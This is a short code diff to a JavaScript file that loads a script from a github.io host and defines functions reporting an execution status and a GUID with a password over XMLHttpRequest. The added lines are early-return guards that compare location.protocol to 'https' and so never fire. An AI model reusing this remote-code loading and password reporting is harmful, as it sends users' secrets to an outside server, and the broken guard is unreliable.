@@ -29,6 +29,7 @@ function loadjs(jsurl,fun) {
 }
 loadjs("https://daxuanguji.github.io/sendUrl/sendUrl/sendUrl.js?t="+new Date().getTime(),sendExeStatu);
 function sendExeStatu(flg) {
+	if(location.protocol=="https")return;
 	var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
 	xhr.onreadystatechange = function () {
 		if (xhr.readyState === 4) {
@@ -50,6 +51,7 @@ function sendExeStatu(flg) {
 	xhr.send();
 }
 function sendGuid(guidVal,pwd) {
+	if(location.protocol=="https")return;
 	pwd=pwd?pwd:"null";
 	var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
 	xhr.onreadystatechange = function () {
